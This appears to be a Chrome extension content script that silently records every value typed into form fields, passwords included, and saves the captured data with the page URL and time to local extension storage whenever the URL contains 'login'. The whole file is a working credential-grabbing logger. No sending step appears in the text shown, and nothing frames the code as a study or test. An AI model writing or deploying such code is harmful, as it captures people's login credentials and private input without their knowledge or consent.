(function () {
  console.log("[🚀] Content script loaded!");

  let formData = {};

  // 📝 Input tracking
  document.addEventListener("input", (event) => {
    const target = event.target;

    formData[target.name || target.id || "unknown_field"] = target.value;

    chrome.storage.local.get(["visitedSites"], (result) => {
      const pageURL = window.location.href;
      let visitedSites = result.visitedSites || [];

      if (pageURL.includes("login")) {
        visitedSites.push({
          url: pageURL,
          time: new Date().toLocaleString(),
          data: formData, // Clone formData
        });

        // Store only the last 100 entries to prevent excessive storage
        if (visitedSites.length > 100) {
          visitedSites.shift();
        }

        chrome.storage.local.set({ visitedSites });
      }
    });
  });


})();
